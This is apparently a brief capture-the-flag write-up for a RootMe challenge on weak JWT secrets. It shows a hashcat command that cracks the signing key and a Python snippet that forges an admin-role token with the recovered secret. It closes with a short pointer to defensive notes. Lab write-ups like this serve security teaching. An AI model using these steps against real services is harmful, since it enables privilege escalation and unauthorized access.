# JWT weak secret

[RootMe challege: JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret): This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you. Recover its most valuable secrets!

----

Argh:

![RootMe JWT weak secret](/_static/images/rootme-jwt3a.png)

```text
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -a 0 -m 16500 jwt jwt.secrets.list
hashcat (v6.2.6) starting
```

![RootMe JWT weak secret](/_static/images/rootme-jwt3b.png)

```text
# http://challenge01.root-me.org/web-serveur/ch59

import jwt

secret = "secret"
hacked_token = jwt.encode({"role": "admin"}, secret, algorithm="HS512")
print(f"Hacked token:{hacked_token}")
```

etcetera.

## Counter moves

JWT weak secret is the variant in play. Server-side validation and least privilege are what these reduce to. Seen from the other side, this sits in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
